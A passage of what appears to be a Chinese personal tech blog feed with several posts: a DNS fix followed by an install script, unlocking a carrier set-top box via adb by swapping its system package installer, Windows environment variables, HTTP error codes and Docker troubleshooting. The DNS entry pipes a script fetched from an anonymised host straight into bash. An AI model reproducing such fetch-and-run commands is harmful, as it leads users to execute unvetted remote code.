Dns 导致的无法连接网络。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">vi</span> /etc/resolv.conf <span class="token comment">#发现 nameserver 后面全是空白</span><span class="token comment">#在后面添加上 8.8.8.8（google dns服务器）114.114.114.114（公共 dns服务器）并保存。</span><span class="token comment">#再执行安装执行</span><span class="token function">bash</span> <span class="token operator">&lt;</span><span class="token punctuation">(</span><span class="token function">curl</span> -Ls https://blog.xxx.xyz/xxi.sh<span class="token punctuation">)</span>  <span class="token comment">#出现了下载进度和安装过程提示，ok完美了</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>破解 联通 贝尔s-010w-a机顶盒</title>
      <link href="/2020/02/02/yuque/cpkq1r/"/>
      <url>/2020/02/02/yuque/cpkq1r/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>现在安装网线基本上都会送给一个电视机顶盒，但是这个机顶盒不是一般的难用；做了很多限制，不能向自己买的电视机顶盒那样安装任意的软件。</p><p>经过一顿的谷歌百度后发现是可以的破解的。</p><p>就有了如下尝试：</p><h2 id="1-探究默认设置"><a href="#1-探究默认设置" class="headerlink" title="1.探究默认设置"></a>1.探究默认设置</h2><p>默认这款机顶盒的 wifi 功能是关闭的只能通过网线连接使用，需要在设置中开启，进入设置提示输入密码（10010 或者 6321）我这里是 6321.进入设置后我们会发现无线连接为灰色的进不去没法设置。<br><img src="https://cdn.nlark.com/yuque/0/2020/jpeg/264343/1580624160964-5dd89b5b-8afd-4c8b-ade8-9f7ccfa0777a.jpeg#align=left&amp;display=inline&amp;height=205&amp;name=IMG_20200202_140531.jpg&amp;originHeight=2250&amp;originWidth=4000&amp;size=2170954&amp;status=done&amp;style=none&amp;width=365" alt="IMG_20200202_140531.jpg"><img src="https://cdn.nlark.com/yuque/0/2020/jpeg/264343/1580624162443-88dadf0e-3d9c-4ec5-b5fb-7287b9b39ed3.jpeg#align=left&amp;display=inline&amp;height=206&amp;name=IMG_20200202_140552.jpg&amp;originHeight=2250&amp;originWidth=4000&amp;size=2355019&amp;status=done&amp;style=none&amp;width=366" alt="IMG_20200202_140552.jpg"><img src="https://cdn.nlark.com/yuque/0/2020/jpeg/264343/1580624164039-9d8fa76b-2d3d-488c-bd99-bfb3703ed7f7.jpeg#align=left&amp;display=inline&amp;height=411&amp;name=IMG_20200202_140615.jpg&amp;originHeight=2250&amp;originWidth=4000&amp;size=2158257&amp;status=done&amp;style=none&amp;width=730" alt="IMG_20200202_140615.jpg"></p><h2 id="2-进入隐藏的神奇设置"><a href="#2-进入隐藏的神奇设置" class="headerlink" title="2.进入隐藏的神奇设置"></a>2.进入隐藏的神奇设置</h2><p>网上说使用 usb 键盘连接机顶盒，按 F2 键可进入所有应用界面有一个圆形的设置 app，在里面可以进行一些神奇的操作。问题是我没有 usb 键盘啊！呜呜呜。。。。<br>不过巧在，家里还有一个电信的机顶盒（中兴 B860AV1.1-T2），我刚开始使用的电信的机顶盒的遥控器操作的，在我按下电信机顶盒的首页按钮后神奇的一幕出现了，这不就是按键盘上的 F2 键出现的所有应用的界面嘛，此处省略无比激动的心情。。。（原本想把频段识别出来分析给大家呢，没找到合适的工具。）<br><img src="https://cdn.nlark.com/yuque/0/2020/jpeg/264343/1580624148407-6330ccc0-cfd9-4ded-a754-145d2f0b857d.jpeg#align=left&amp;display=inline&amp;height=203&amp;name=IMG_20200202_135727.jpg&amp;originHeight=2250&amp;originWidth=4000&amp;size=2476573&amp;status=done&amp;style=none&amp;width=360" alt="IMG_20200202_135727.jpg"></p><h2 id="3-开启-wifi"><a href="#3-开启-wifi" class="headerlink" title="3.开启 wifi"></a>3.开启 wifi</h2><p>接下来就是一顿操作，首先进入网络设置开启 wifi 连接家里我 Iwifi 网络，然后看到下面竟然还有无限热点功能，但是由于是单网卡，开启热点后 wifi 功能就关闭了（应该是为网线用户设计的）；接着发现竟然还有蓝牙功能，经过多次尝试都没能打开就没再尝试（也没什么用）；<br><img src="https://cdn.nlark.com/yuque/0/2020/jpeg/264343/1580624151678-8ee67bee-c80c-4512-8958-cc2a4fb9ffa6.jpeg#align=left&amp;display=inline&amp;height=195&amp;name=IMG_20200202_135806.jpg&amp;originHeight=2250&amp;originWidth=4000&amp;size=3189490&amp;status=done&amp;style=none&amp;width=346" alt="IMG_20200202_135806.jpg"><img src="https://cdn.nlark.com/yuque/0/2020/jpeg/264343/1580624150332-b39f69b3-6ae9-4aec-b363-057ddf2a8470.jpeg#align=left&amp;display=inline&amp;height=195&amp;name=IMG_20200202_135745.jpg&amp;originHeight=2250&amp;originWidth=4000&amp;size=2417696&amp;status=done&amp;style=none&amp;width=346" alt="IMG_20200202_135745.jpg"></p><h2 id="4-重点来了，开启调试"><a href="#4-重点来了，开启调试" class="headerlink" title="4.重点来了，开启调试"></a>4.重点来了，开启调试</h2><p>向右翻到第二页看到有一个开发者选项功能（此刻想到了手机的 usb 调试功能，嘿嘿嘿），赶紧进入一看还真有，接着就是设置“允许未知来源程序”设置为是、“允许 USB 调试”设置为已打开。网上说的使用 360 手机助手进行连接，发现 360 手机助手的网页死活打不开就没下载。<br><img src="https://cdn.nlark.com/yuque/0/2020/jpeg/264343/1580624153383-21c421d8-5e3b-4397-a256-4e4eea23c0f9.jpeg#align=left&amp;display=inline&amp;height=194&amp;name=IMG_20200202_135819.jpg&amp;originHeight=2250&amp;originWidth=4000&amp;size=2501959&amp;status=done&amp;style=none&amp;width=345" alt="IMG_20200202_135819.jpg"><img src="https://cdn.nlark.com/yuque/0/2020/jpeg/264343/1580624155642-93fa87e1-1094-45a3-b4be-e324f286e27f.jpeg#align=left&amp;display=inline&amp;height=196&amp;name=IMG_20200202_135833.jpg&amp;originHeight=2250&amp;originWidth=4000&amp;size=2903390&amp;status=done&amp;style=none&amp;width=348" alt="IMG_20200202_135833.jpg"></p><h2 id="5-通过-TV-盒子助手-进行无线连接操作"><a href="#5-通过-TV-盒子助手-进行无线连接操作" class="headerlink" title="5.通过 &nbsp;TV 盒子助手 &nbsp; 进行无线连接操作"></a>5.通过 &nbsp;TV 盒子助手 &nbsp; 进行无线连接操作</h2><p>经过使用“TV 盒子助手”（测试发现新版本获取不到应用列表信息，无法进行安装 app，这里使用的是 3.0.42.1 版本）进行连接测试(说明一下要打开“允许 Usb 调试”才能搜到并成功连接设备)；接着当然就是安装著名的当贝桌面和当贝市场了，按遥控板上的首页按钮设置默认桌面为当贝桌面（忘记拍照），然后试了试精简系统功能，成功的删除了盒子中内置的无用垃圾 app。<br><img src="https://cdn.nlark.com/yuque/0/2020/png/264343/1580624741321-6a151b27-89e9-4b38-b56c-4d5de89edee7.png#align=left&amp;display=inline&amp;height=245&amp;name=image.png&amp;originHeight=600&amp;originWidth=900&amp;size=70401&amp;status=done&amp;style=none&amp;width=368" alt="image.png"><img src="https://cdn.nlark.com/yuque/0/2020/png/264343/1580624771890-6167c0bf-08dd-4bf9-8153-38faee7b4a63.png#align=left&amp;display=inline&amp;height=245&amp;name=image.png&amp;originHeight=600&amp;originWidth=900&amp;size=71368&amp;status=done&amp;style=none&amp;width=368" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2020/png/264343/1580625585991-c40ae72a-396d-48d0-af66-c25220347ffc.png#align=left&amp;display=inline&amp;height=199&amp;name=image.png&amp;originHeight=600&amp;originWidth=900&amp;size=93123&amp;status=done&amp;style=none&amp;width=298" alt="image.png"><img src="https://cdn.nlark.com/yuque/0/2020/jpeg/264343/1580624156862-9c206d6c-686a-45ee-8f7f-d3c3a632334c.jpeg#align=left&amp;display=inline&amp;height=197&amp;name=IMG_20200202_140504.jpg&amp;originHeight=2250&amp;originWidth=4000&amp;size=2732650&amp;status=done&amp;style=none&amp;width=350" alt="IMG_20200202_140504.jpg"></p><h2 id="6-这样就完了吗-答案当然是没有！"><a href="#6-这样就完了吗-答案当然是没有！" class="headerlink" title="6.这样就完了吗?答案当然是没有！"></a>6.这样就完了吗?答案当然是没有！</h2><p>在进入当贝市场就提示安装更新，那就更新呗，结果安装时提示“本终端不允许安装第三方应用”（忘记拍照），经过多次尝试依旧是如此（开关 &nbsp; 允许未知来源程序）。由于之前搞过安卓开发，了解安装程序是通过“程序安装器”来实现安装的，就想到了运营商一定是对“程序安装器”动了手脚，当时只想着怎么破解他这个“程序安装器”再进行替换了，在网上发现一个替换 4.4.4 官方“程序安装器”的方法给我灵机一动；</p><h2 id="7-破解安装三方软件替换官方“程序安装器”"><a href="#7-破解安装三方软件替换官方“程序安装器”" class="headerlink" title="7.破解安装三方软件替换官方“程序安装器”"></a>7.破解安装三方软件替换官方“程序安装器”</h2><p>现在机顶盒没有 root，也没找到合适的获取 root 的方法；直接使用了 usb 线连接电脑的方法进行处理，机顶盒离电源近的一个 usb 接口是可是进行 adb 操作的；<br>剪了两根之前手机上的数据线，接成一根双 usb 公头的线，（我这里的黑线坏了，又找了一根）<br><img src="https://cdn.nlark.com/yuque/0/2020/jpeg/264343/1580624144885-d8150b2e-a812-46ef-9573-1c9baa228bff.jpeg#align=left&amp;display=inline&amp;height=2250&amp;name=IMG_20200202_091648.jpg&amp;originHeight=2250&amp;originWidth=4000&amp;size=3017869&amp;status=done&amp;style=none&amp;width=4000" alt="IMG_20200202_091648.jpg"><br>连接机顶盒和电脑，在机顶盒的开发者选项中开启“Usb 连接状态”，电脑就能识别到一个移动终端的设备了(类似于一部手机)；</p><p><img src="https://cdn.nlark.com/yuque/0/2020/jpeg/264343/1580624155642-93fa87e1-1094-45a3-b4be-e324f286e27f.jpeg#align=left&amp;display=inline&amp;height=227&amp;name=IMG_20200202_135833.jpg&amp;originHeight=2250&amp;originWidth=4000&amp;size=2903390&amp;status=done&amp;style=none&amp;width=403" alt="IMG_20200202_135833.jpg">renity-Mipro 器<br><img src="https://cdn.nlark.com/yuque/0/2020/png/264343/1580625716519-8c0354b8-9a7d-409d-ae76-3c98d7648772.png#align=left&amp;display=inline&amp;height=205&amp;name=image.png&amp;originHeight=252&amp;originWidth=340&amp;size=16200&amp;status=done&amp;style=none&amp;width=276" alt="image.png"><img src="https://cdn.nlark.com/yuque/0/2020/png/264343/1580625689696-d39cc675-a66d-4e2a-ab16-ed1b1caedd6c.png#align=left&amp;display=inline&amp;height=200&amp;name=image.png&amp;originHeight=197&amp;originWidth=361&amp;size=15372&amp;status=done&amp;style=none&amp;width=366" alt="image.png"></p><p>接着就是找出 adb 工具了，我这里使用的是 AS 中 sdk 中的工具集，当然你可以直接百度进行下载。使用下面的命令进行替换为官方的“程序安装器”&nbsp; ：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">adb devices <span class="token comment">#连接并显示设备列表，设备正常连接后会显示在下面前面为一串数字，后面是device才正常，否则不正常，重新进行连接（adb kill-server &amp;&amp; adb start-server）</span>adb remount <span class="token comment">#挂载设备</span>adb shell   <span class="token comment">#进入shell</span><span class="token function">mv</span> /system/app/PackageInstaller.apk /system/app/PackageInstaller.apk.bak <span class="token comment">#备份原来的 程序安装器</span><span class="token builtin class-name">exit</span> <span class="token comment">#退出shell</span>adb push PackageInstaller.apk /system/app/ <span class="token comment"># 将你下载的应用安装器拷贝到系统目录</span><span class="token function">reboot</span> <span class="token comment">#重启设备自动更新应用。一定要重启，不然安装无法进行下一步就结束了。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.nlark.com/yuque/0/2020/png/264343/1580626293761-f1699e0b-5769-462f-8957-d60fde50eae4.png#align=left&amp;display=inline&amp;height=225&amp;name=image.png&amp;originHeight=315&amp;originWidth=544&amp;size=269957&amp;status=done&amp;style=none&amp;width=388" alt="image.png"><img src="https://cdn.nlark.com/yuque/0/2020/png/264343/1580626402455-3ab3faa6-b502-4d34-b2b8-f2cef3ad9358.png#align=left&amp;display=inline&amp;height=224&amp;name=image.png&amp;originHeight=373&amp;originWidth=535&amp;size=315059&amp;status=done&amp;style=none&amp;width=322" alt="image.png"><br>破解过程中忘记截图，上图是之后截得<br>装个优酷、腾讯视频、电视家（看电视台直播的软件），想装什么软件直接在“当贝市场”装就行了和手机安装软件一模一样，到此就完美的破解了这款机顶盒。<br><img src="https://cdn.nlark.com/yuque/0/2020/jpeg/264343/1580624156862-9c206d6c-686a-45ee-8f7f-d3c3a632334c.jpeg#align=left&amp;display=inline&amp;height=201&amp;name=IMG_20200202_140504.jpg&amp;originHeight=2250&amp;originWidth=4000&amp;size=2732650&amp;status=done&amp;style=none&amp;width=358" alt="IMG_20200202_140504.jpg"><img src="https://cdn.nlark.com/yuque/0/2020/jpeg/264343/1580624159242-3547e88f-9684-46d7-8265-5b4c88172de3.jpeg#align=left&amp;display=inline&amp;height=200&amp;name=IMG_20200202_140515.jpg&amp;originHeight=2250&amp;originWidth=4000&amp;size=3665815&amp;status=done&amp;style=none&amp;width=355" alt="IMG_20200202_140515.jpg">&nbsp;<br>最后是用到的工具资料下载地址：<a href="https://www.lanzous.com/b0fd6fe0j">https://www.lanzous.com/b0fd6fe0j</a>&nbsp; 密码:6ugz</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Windows常用环境变量值</title>
      <link href="/2020/01/03/yuque/idh6x3/"/>
      <url>/2020/01/03/yuque/idh6x3/</url>
      
        <content type="html"><![CDATA[<p>在很多情况下我们需要获取当前用户目录来操作文件，我这边的使用环境是批处理在不同电脑上运行，需要获取当前用户目录下文件来操作。<br>通过环境变量%USERPROFILE%就可以获取了<br>在 cmd 下输入 echo %USERPROFILE%可以查看当前系统用户目录</p><p>这边列举一些其他常用的获取系统路径的：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">%WINDIR%                 <span class="token punctuation">{</span>系统目录 - C:<span class="token punctuation">\</span>WINDOWS<span class="token punctuation">}</span>%SYSTEMROOT%             <span class="token punctuation">{</span>系统目录 - C:<span class="token punctuation">\</span>WINDOWS<span class="token punctuation">}</span>%SYSTEMDRIVE%            <span class="token punctuation">{</span>系统根目录 - C:<span class="token punctuation">}</span>%HOMEDRIVE%              <span class="token punctuation">{</span>当前用户根目录 - C:<span class="token punctuation">}</span>%USERPROFILE%            <span class="token punctuation">{</span>当前用户目录 - C:<span class="token punctuation">\</span>Documents and Settings<span class="token punctuation">\</span>wy<span class="token punctuation">}</span>%HOMEPATH%               <span class="token punctuation">{</span>当前用户路径 - <span class="token punctuation">\</span>Documents and Settings<span class="token punctuation">\</span>wy<span class="token punctuation">}</span>%TMP%                    <span class="token punctuation">{</span>当前用户临时文件夹 - C:<span class="token punctuation">\</span>DOCUME~1<span class="token punctuation">\</span>wy<span class="token punctuation">\</span>LOCALS~1<span class="token punctuation">\</span>Temp<span class="token punctuation">}</span>%TEMP%                   <span class="token punctuation">{</span>当前用户临时文件夹 - C:<span class="token punctuation">\</span>DOCUME~1<span class="token punctuation">\</span>wy<span class="token punctuation">\</span>LOCALS~1<span class="token punctuation">\</span>Temp<span class="token punctuation">}</span>%APPDATA%                <span class="token punctuation">{</span>当前用户数据文件夹 - C:<span class="token punctuation">\</span>Documents and Settings<span class="token punctuation">\</span>wy<span class="token punctuation">\</span>Application Data<span class="token punctuation">}</span>%PROGRAMFILES%           <span class="token punctuation">{</span>程序默认安装目录 - C:<span class="token punctuation">\</span>Program Files<span class="token punctuation">}</span>%COMMONPROGRAMFILES%     <span class="token punctuation">{</span>文件通用目录 - C:<span class="token punctuation">\</span>Program Files<span class="token punctuation">\</span>Common Files<span class="token punctuation">}</span>%USERNAME%               <span class="token punctuation">{</span>当前用户名 - wy<span class="token punctuation">}</span>%ALLUSERSPROFILE%        <span class="token punctuation">{</span>所有用户文件目录 - C:<span class="token punctuation">\</span>Documents and Settings<span class="token punctuation">\</span>All Users<span class="token punctuation">}</span>%OS%                     <span class="token punctuation">{</span>操作系统名 - Windows_NT<span class="token punctuation">}</span>%COMPUTERNAME%           <span class="token punctuation">{</span>计算机名 - IBM-B63851E95C9<span class="token punctuation">}</span>%NUMBER_OF_PROCESSORS%   <span class="token punctuation">{</span>处理器个数 - <span class="token number">1</span><span class="token punctuation">}</span>%PROCESSOR_ARCHITECTURE% <span class="token punctuation">{</span>处理器芯片架构 - x86<span class="token punctuation">}</span>%PROCESSOR_LEVEL%        <span class="token punctuation">{</span>处理器型号 - <span class="token number">6</span><span class="token punctuation">}</span>%PROCESSOR_REVISION%     <span class="token punctuation">{</span>处理器修订号 - 0905<span class="token punctuation">}</span>%USERDOMAIN%             <span class="token punctuation">{</span>包含用户帐号的域 - IBM-B63851E95C9<span class="token punctuation">}</span>%<span class="token environment constant">PATH</span>%    <span class="token punctuation">{</span>搜索路径<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>常见web错误码</title>
      <link href="/2020/01/03/yuque/uin3n7/"/>
      <url>/2020/01/03/yuque/uin3n7/</url>
      
        <content type="html"><![CDATA[<p>我们知道，最常见的 web 错误码 404 表示文件或资源未找到，但还有其他的错误代码，下面整理出来：</p><h2 id="一、1xx-信息提示：这些状态代码表示临时的响应。客户端在收到常规响应之前，应准备接收一个或多个-1xx-响应。"><a href="#一、1xx-信息提示：这些状态代码表示临时的响应。客户端在收到常规响应之前，应准备接收一个或多个-1xx-响应。" class="headerlink" title="一、1xx-信息提示：这些状态代码表示临时的响应。客户端在收到常规响应之前，应准备接收一个或多个 1xx 响应。"></a>一、1xx-信息提示：这些状态代码表示临时的响应。客户端在收到常规响应之前，应准备接收一个或多个 1xx 响应。</h2><p>100-继续。<br>101-切换协议。</p><h2 id="二、2xx-成功：这类状态代码表明服务器成功地接受了客户端请求。"><a href="#二、2xx-成功：这类状态代码表明服务器成功地接受了客户端请求。" class="headerlink" title="二、2xx-成功：这类状态代码表明服务器成功地接受了客户端请求。"></a>二、2xx-成功：这类状态代码表明服务器成功地接受了客户端请求。</h2><p>200-确定。客户端请求已成功。<br>201-已创建。<br>202-已接受。<br>203-非权威性信息。<br>204-无内容。<br>205-重置内容。<br>206-部分内容。</p><h2 id="三、3xx-重定向：客户端浏览器必须采取更多操作来实现请求。例如，浏览器可能不得不请求服务器上的不同的页面，或通过代理服务器重复该请求。"><a href="#三、3xx-重定向：客户端浏览器必须采取更多操作来实现请求。例如，浏览器可能不得不请求服务器上的不同的页面，或通过代理服务器重复该请求。" class="headerlink" title="三、3xx-重定向：客户端浏览器必须采取更多操作来实现请求。例如，浏览器可能不得不请求服务器上的不同的页面，或通过代理服务器重复该请求。"></a>三、3xx-重定向：客户端浏览器必须采取更多操作来实现请求。例如，浏览器可能不得不请求服务器上的不同的页面，或通过代理服务器重复该请求。</h2><p>301-对象已永久移走，即永久重定向。<br>302-对象已临时移动。<br>304-未修改。<br>307-临时重定向。</p><h2 id="四、4xx-客户端错误：发生错误，客户端似乎有问题。例如，客户端请求不存在的页面，客户端未提供有效的身份验证信息。400-错误的请求。"><a href="#四、4xx-客户端错误：发生错误，客户端似乎有问题。例如，客户端请求不存在的页面，客户端未提供有效的身份验证信息。400-错误的请求。" class="headerlink" title="四、4xx-客户端错误：发生错误，客户端似乎有问题。例如，客户端请求不存在的页面，客户端未提供有效的身份验证信息。400-错误的请求。"></a>四、4xx-客户端错误：发生错误，客户端似乎有问题。例如，客户端请求不存在的页面，客户端未提供有效的身份验证信息。400-错误的请求。</h2><p>401-访问被拒绝。IIS 定义了许多不同的 401 错误，它们指明更为具体的错误原因。这些具体的错误代码在浏览器中显示，但不在 IIS 日志中显示：<br>401.1-登录失败。<br>401.2-服务器配置导致登录失败。<br>401.3-由于 ACL 对资源的限制而未获得授权。<br>401.4-筛选器授权失败。<br>401.5-ISAPI/CGI 应用程序授权失败。<br>401.7–访问被 Web 服务器上的 URL 授权策略拒绝。这个错误代码为 IIS6.0 所专用。 403-禁止访问：IIS 定义了许多不同的 403 错误，它们指明更为具体的错误原因：<br>403.1-执行访问被禁止。<br>403.2-读访问被禁止。<br>403.3-写访问被禁止。<br>403.4-要求 SSL。<br>403.5-要求 SSL128。<br>403.6-IP 地址被拒绝。<br>403.7-要求客户端证书。<br>403.8-站点访问被拒绝。<br>403.9-用户数过多。<br>403.10-配置无效。<br>403.11-密码更改。<br>403.12-拒绝访问映射表。<br>403.13-客户端证书被吊销。<br>403.14-拒绝目录列表。<br>403.15-超出客户端访问许可。<br>403.16-客户端证书不受信任或无效。<br>403.17-客户端证书已过期或尚未生效。<br>403.18-在当前的应用程序池中不能执行所请求的 URL。这个错误代码为 IIS6.0 所专用。<br>403.19-不能为这个应用程序池中的客户端执行 CGI。这个错误代码为 IIS6.0 所专用。<br>403.20-Passport 登录失败。这个错误代码为 IIS6.0 所专用。<br>404-文件或资源未找到。<br>404.0-（无）–没有找到文件或目录。<br>404.1-无法在所请求的端口上访问 Web 站点。<br>404.2-Web 服务扩展锁定策略阻止本请求。<br>404.3-MIME 映射策略阻止本请求。<br>405-用来访问本页面的 HTTP 谓词不被允许（方法不被允许）<br>406-客户端浏览器不接受所请求页面的 MIME 类型。<br>407-要求进行代理身份验证。<br>412-前提条件失败。<br>413–请求实体太大。<br>414-请求 URI 太长。<br>415–不支持的媒体类型。<br>416–所请求的范围无法满足。<br>417–执行失败。<br>423–锁定的错误。</p><h2 id="五、5xx-服务器错误：服务器由于遇到错误而不能完成该请求。"><a href="#五、5xx-服务器错误：服务器由于遇到错误而不能完成该请求。" class="headerlink" title="五、5xx-服务器错误：服务器由于遇到错误而不能完成该请求。"></a>五、5xx-服务器错误：服务器由于遇到错误而不能完成该请求。</h2><p>500-内部服务器错误。<br>500.12-应用程序正忙于在 Web 服务器上重新启动。<br>500.13-Web 服务器太忙。<br>500.15-不允许直接请求 Global.asa。<br>500.16–UNC 授权凭据不正确。这个错误代码为 IIS6.0 所专用。<br>500.18–URL 授权存储不能打开。这个错误代码为 IIS6.0 所专用。<br>500.100-内部 ASP 错误。<br>501-页眉值指定了未实现的配置。<br>502-Web 服务器用作网关或代理服务器时收到了无效响应。<br>502.1-CGI 应用程序超时。<br>502.2-CGI 应用程序出错。application.<br>503-服务不可用。这个错误代码为 IIS6.0 所专用。<br>504-网关超时。<br>505-HTTP 版本不受支持。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Docker 问题汇总</title>
      <link href="/2019/12/23/yuque/yzblv4/"/>
      <url>/2019/12/23/yuque/yzblv4/</url>
      
        <content type="html"><![CDATA[<p>本文为解决问题实际操作，不做过多原理解释，不明白请自行 google</p><h2 id="1-免-root-权限操作-docker（为当前用户添加执行-docker-的权限）"><a href="#1-免-root-权限操作-docker（为当前用户添加执行-docker-的权限）" class="headerlink" title="1.免 root 权限操作 docker（为当前用户添加执行 docker&nbsp; 的权限）"></a>1.免 root 权限操作 docker（为当前用户添加执行 docker&nbsp; 的权限）</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#centos</span><span class="token function">sudo</span> gpasswd -a <span class="token environment constant">$USER</span> docker     <span class="token comment">#将登陆用户加入到docker用户组中</span>newgrp docker     <span class="token comment">#更新用户组</span>docker <span class="token function">ps</span>    <span class="token comment">#测试docker命令是否可以使用sudo正常使用</span><span class="token comment">#ubuntu</span><span class="token function">sudo</span> <span class="token function">usermod</span> -aG docker <span class="token environment constant">$USER</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-修复-Docker-没有提示"><a href="#2-修复-Docker-没有提示" class="headerlink" title="2.修复 Docker 没有提示"></a>2.修复 Docker 没有提示</h2><h3 id="⑴-检查-bashrc-中是否包含如下脚本、及-etc-bash-completion-目录"><a href="#⑴-检查-bashrc-中是否包含如下脚本、及-etc-bash-completion-目录" class="headerlink" title="⑴.检查 ~/.bashrc 中是否包含如下脚本、及/etc/bash_completion 目录"></a>⑴.检查 ~/.bashrc 中是否包含如下脚本、及/etc/bash_completion 目录</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#先检查是否包含/etc/bash_completion目录，如果不包含直接看⑵</span><span class="token keyword">if</span> <span class="token operator">!</span> <span class="token builtin class-name">shopt</span> -oq posix<span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">if</span> <span class="token punctuation">[</span> -f /usr/share/bash-completion/bash_completion <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>    <span class="token builtin class-name">.</span> /usr/share/bash-completion/bash_completion  <span class="token keyword">elif</span> <span class="token punctuation">[</span> -f /etc/bash_completion <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>    <span class="token builtin class-name">.</span> /etc/bash_completion  <span class="token keyword">fi</span><span class="token keyword">fi</span><span class="token comment"># 不一定和我这里的完全一样 包含/etc/bash_completion 就好，如果是注释了就解除注释</span><span class="token comment"># 如果不包含就添加上然后执行source ~/.bashrc，再测试是否可行，不行的话继续往下看</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="⑵-安装-bash-completion，开启提示功能"><a href="#⑵-安装-bash-completion，开启提示功能" class="headerlink" title="⑵.安装 bash-completion，开启提示功能"></a>⑵.安装 bash-completion，开启提示功能</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> -y bash-completion <span class="token comment"># 1.自动补齐需要依赖工具bash-complete，如果没有，则需要手动安装</span><span class="token builtin class-name">source</span> /usr/share/bash-completion/bash_completion <span class="token comment"># 2.生效脚本</span><span class="token builtin class-name">source</span> /usr/share/bash-completion/completions/docker <span class="token comment"># 3.如果还不行就执行这个</span><span class="token comment"># 4.docker-compose没提示的话就执行下面这句</span><span class="token builtin class-name">source</span> /usr/share/bash-completion/completions/docker-compose<span class="token comment"># 请再按照⑴的方法检测一遍，防止下次连接后没有提示。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-centos-修复-docker-logs-不显示日志（更新-Docker-版本）"><a href="#3-centos-修复-docker-logs-不显示日志（更新-Docker-版本）" class="headerlink" title="3.[centos]修复 docker&nbsp;logs 不显示日志（更新 Docker 版本）"></a>3.[centos]修复 docker&nbsp;logs 不显示日志（更新 Docker 版本）</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#首先看了一下docker的版本</span>$ docker -vDocker version <span class="token number">1.13</span>.1, build 7f2769b/1.13.1<span class="token comment">#发现版本比较低，试了好多种方法都没能解决；具体原因不太清楚，可能是这个版本的bug，想着升级一下试试吧，说干就干！</span><span class="token comment">#卸载旧版本： 只是卸载管理软件，镜像和容器不会丢失</span><span class="token comment">#千万不要删除 /var/lib/docker/ 会导致镜像容器丢失</span>$ <span class="token function">sudo</span> yum remove docker <span class="token punctuation">\</span>           docker-client <span class="token punctuation">\</span>           docker-client-latest <span class="token punctuation">\</span>           docker-common <span class="token punctuation">\</span>           docker-latest <span class="token punctuation">\</span>           docker-latest-logrotate <span class="token punctuation">\</span>           docker-logrotate <span class="token punctuation">\</span>           docker-selinux <span class="token punctuation">\</span>           docker-engine-selinux <span class="token punctuation">\</span>           docker-engine<span class="token comment">#安装一些必要的系统工具：</span>$ <span class="token function">sudo</span> yum <span class="token function">install</span> -y yum-utils device-mapper-persistent-data lvm2<span class="token comment">#添加软件源信息：</span>$ <span class="token function">sudo</span> yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo<span class="token comment">#更新 yum 缓存：</span>$ <span class="token function">sudo</span> yum makecache fast<span class="token comment">#安装最新docker-ce（社区版）</span>$ <span class="token function">sudo</span> yum -y <span class="token function">install</span> docker-ce<span class="token comment"># ***重新加载配置文件,否则修改不会生效。***</span><span class="token comment">#会导致docker运行异常，如：启动容器提示“Error response from daemon: Unknown runtime specified docker-runc”</span>$ <span class="token function">sudo</span> systemctl daemon-reload<span class="token comment">#重启docker</span>$ <span class="token function">sudo</span> systemctl restart docker<span class="token comment">#设置docker开机自启</span>$ <span class="token function">sudo</span> systemctl <span class="token builtin class-name">enable</span> docker<span class="token comment">#然后在进行测试</span>$ docker logs 容器名称<span class="token comment">### ok可以正常显示日志了，至此问题解决成功。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="4-安装或升级-DockerCompose"><a href="#4-安装或升级-DockerCompose" class="headerlink" title="4.安装或升级 DockerCompose"></a>4.安装或升级 DockerCompose</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> -L https://github.com/docker/compose/releases/download/1.25.4/docker-compose-<span class="token variable"><span class="token variable">`</span><span class="token function">uname</span> -s<span class="token variable">`</span></span>-<span class="token variable"><span class="token variable">`</span><span class="token function">uname</span> 